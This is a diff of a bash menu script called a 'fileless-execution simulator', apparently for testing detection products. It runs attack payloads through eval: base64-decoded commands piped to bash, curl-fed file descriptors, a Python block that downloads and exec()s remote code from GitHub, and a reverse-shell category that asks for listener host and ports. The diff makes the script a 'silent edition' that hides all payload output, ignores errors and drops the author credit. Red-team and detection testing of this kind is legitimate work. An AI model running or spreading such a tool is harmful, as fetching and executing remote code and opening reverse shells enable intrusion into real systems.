@@ -1,19 +1,16 @@
 #!/usr/bin/env bash
 #
-# fileless-menu.sh  –  Upwind fileless-execution simulator
-# (c) Lior Boehm
+# fileless-menu.sh – Upwind fileless-execution simulator (silent edition)
 # ------------------------------------------------------------
-#  • Option 1-4  = run **all** payloads in that category
-#  • Option 5    = run **every** payload in the script
-#  • Colours + FIGLET banner
-#  • Prompts once for LHOST/LPORT* when needed
+# 1-4  run every payload in the chosen category (errors ignored)
+# 5    runs ALL payloads (errors ignored)
+# Output from payloads is completely suppressed.
 # ------------------------------------------------------------
 
-set -eo pipefail               # fail only on real errors
-shopt -s extglob               # extended patterns
+set -uo pipefail          # only nounset + pipefail; no -e (errexit)
 
-# ── ANSI colours ──────────────────────────────────────────────
-RESET=$'\e[0m'; BOLD=$'\e[1m'
+# ── Colours ───────────────────────────────────────────────────
+RESET=$'\e[0m'; BOLD=$'\e[1m'; DIM=$'\e[2m'
 BLU=$'\e[1;34m'; CYN=$'\e[1;36m'
 GRN=$'\e[1;32m'; YEL=$'\e[1;33m'
 RED=$'\e[1;31m'; MAG=$'\e[1;35m'
@@ -25,9 +22,8 @@ declare -A CAT_COL=(
   [AdvancedFD]="$MAG"
 )
 
-# ── Payload library (verbatim, but Encoding #5 fixed) ─────────
+# ── Payload blocks (Encoding #5 already fixed) ────────────────
 declare -A categories
-
 categories[Encoding]='
 # 5
 echo "ZWNobyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK" | base64 -d | bash
@@ -75,54 +71,53 @@ exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.c
 #18
 python3 - <<'PY'
 import urllib.request, sys
-print("[*] Inline Python payload executed (test.py)")
 exec(urllib.request.urlopen("https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py").read().decode())
 PY
 '
 
-# ── Defaults & interactive prompt for net vars ───────────────
+# ── Defaults + prompt (once) for reverse-shell vars ───────────
 LHOST=${LHOST:-127.0.0.1}
 LPORT1=${LPORT1:-4441}
 LPORT2=${LPORT2:-4442}
 LPORT3=${LPORT3:-4443}
 
 ask_net_vars() {
-  echo -e "${BOLD}${CYN}→ Reverse-shell payload selected. Enter listener details (Enter = keep default).${RESET}"
-  read -rp "  LHOST  [${LHOST}]: " tmp && [[ $tmp ]] && LHOST=$tmp
-  read -rp "  LPORT1 [${LPORT1}]: " tmp && [[ $tmp ]] && LPORT1=$tmp
-  read -rp "  LPORT2 [${LPORT2}]: " tmp && [[ $tmp ]] && LPORT2=$tmp
-  read -rp "  LPORT3 [${LPORT3}]: " tmp && [[ $tmp ]] && LPORT3=$tmp
+  echo -e "${DIM}(reverse shell vars – blank = keep default)${RESET}"
+  read -rp "  LHOST  [${LHOST}]: " t && [[ $t ]] && LHOST=$t
+  read -rp "  LPORT1 [${LPORT1}]: " t && [[ $t ]] && LPORT1=$t
+  read -rp "  LPORT2 [${LPORT2}]: " t && [[ $t ]] && LPORT2=$t
+  read -rp "  LPORT3 [${LPORT3}]: " t && [[ $t ]] && LPORT3=$t
 }
 
-# ── Execution helpers ─────────────────────────────────────────
-run_block() {                   # arg = block of commands
-  local block="$1"; set +u
+# ── Silent execution helpers ─────────────────────────────────
+run_block() {                  # arg = block
+  local block="$1" n=0
   while IFS= read -r line; do
-    [[ $line =~ ^#\  ]] && continue
+    [[ $line =~ ^#\  ]] && { n="${line//[^0-9]/}"; continue; }
     [[ $line ]] || continue
-    echo -e "${YEL}[▶] $line${RESET}"
-    eval "$line"
+    printf "%b▶  #%d  %s%b\n" "$DIM" "$n" "${1%%$'\n'*}" "$RESET"
+    # run command silently; ignore errors
+    eval "$line" >/dev/null 2>&1 || true
   done <<< "$block"
-  set -u
 }
 
-execute_category() {            # arg = category
+execute_category() {           # arg = category name
   [[ $1 == ReverseShells ]] && ask_net_vars
   run_block "${categories[$1]}"
 }
 
 execute_all() {
   for c in Encoding Downloaders ReverseShells AdvancedFD; do
-    echo -e "\n${BOLD}${CAT_COL[$c]}=== $c ===${RESET}\n"
+    printf "\n%b=== %s ===%b\n" "${CAT_COL[$c]}" "$c" "$RESET"
     execute_category "$c"
   done
 }
 
-# ── Menu drawing ──────────────────────────────────────────────
+# ── UI helpers ───────────────────────────────────────────────
 draw_banner() {
   clear
   if command -v figlet >/dev/null; then
-    figlet -f slant Upwind | sed "s/^/${MAG}/;s/$/${RESET}/"
+    figlet -f slant Upwind 2>/dev/null | sed "s/^/${MAG}/;s/$/${RESET}/"
   else
     echo -e "${MAG}${BOLD}*** Upwind ***${RESET}"
   fi
@@ -131,16 +126,15 @@ draw_banner() {
 
 draw_menu() {
   echo -e "${BOLD}== Choose an option ==${RESET}"
-  printf "%s1%s) %bEncoding%b\n"        "$BLU" "$RESET" "$YEL" "$RESET"
-  printf "%s2%s) %bDownloaders%b\n"     "$BLU" "$RESET" "$GRN" "$RESET"
-  printf "%s3%s) %bReverseShells%b\n"   "$BLU" "$RESET" "$RED" "$RESET"
-  printf "%s4%s) %bAdvancedFD%b\n"      "$BLU" "$RESET" "$MAG" "$RESET"
-  printf "%s5%s) %bALL PAYLOADS%b\n"    "$BLU" "$RESET" "$CYN" "$RESET"
-  printf "%sq%s) %bQuit%b\n"            "$BLU" "$RESET" "$BOLD" "$RESET"
+  printf "%s1%s) Encoding\n"        "$BLU" "$RESET"
+  printf "%s2%s) Downloaders\n"     "$BLU" "$RESET"
+  printf "%s3%s) ReverseShells\n"   "$BLU" "$RESET"
+  printf "%s4%s) AdvancedFD\n"      "$BLU" "$RESET"
+  printf "%s5%s) ALL PAYLOADS\n"    "$BLU" "$RESET"
+  printf "%sq%s) Quit\n"            "$BLU" "$RESET"
 }
 
 # ── Main loop ────────────────────────────────────────────────
-set +u
 while true; do
   draw_banner
   draw_menu
@@ -154,6 +148,6 @@ while true; do
     [Qq]) exit 0;;
     *) echo "Invalid option"; sleep 1;;
   esac
-  echo -e "\n${GRN}✓ Payload(s) finished. Press Enter for menu…${RESET}"
+  echo -e "\n${GRN}✓ Done – press Enter for menu…${RESET}"
   read -r
 done
